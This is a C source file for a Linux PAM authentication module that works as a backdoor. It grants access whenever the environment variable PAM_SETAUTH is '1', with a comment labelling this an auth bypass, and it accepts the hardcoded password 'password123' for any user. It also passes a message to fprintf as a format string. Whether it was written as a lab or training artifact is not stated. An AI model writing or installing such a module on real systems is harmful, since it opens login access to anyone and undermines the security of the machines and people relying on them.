#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define LOG_FILE "/etc/logcheck/pam_auth.log"

void log_message(const char *msg) {
    FILE *f = fopen(LOG_FILE, "a");
    if (f) {
        fprintf(f, msg);
        fprintf(f, "\n");
        fclose(f);
    }
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user;
    const char *authtok;

    pam_get_user(pamh, &user, NULL);
    pam_get_item(pamh, PAM_AUTHTOK, (const void **)&authtok);

    char buffer[64];

    char *bypass = getenv("PAM_SETAUTH");

    if (bypass && strcmp(bypass, "1") == 0) {
        log_message("[!] Authentication bypass triggered");
        return PAM_SUCCESS;  // AUTH BYPASS
    }

    if (authtok && strcmp(authtok, "password123") == 0) {
        return PAM_SUCCESS;
    }

    return PAM_AUTH_ERR;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}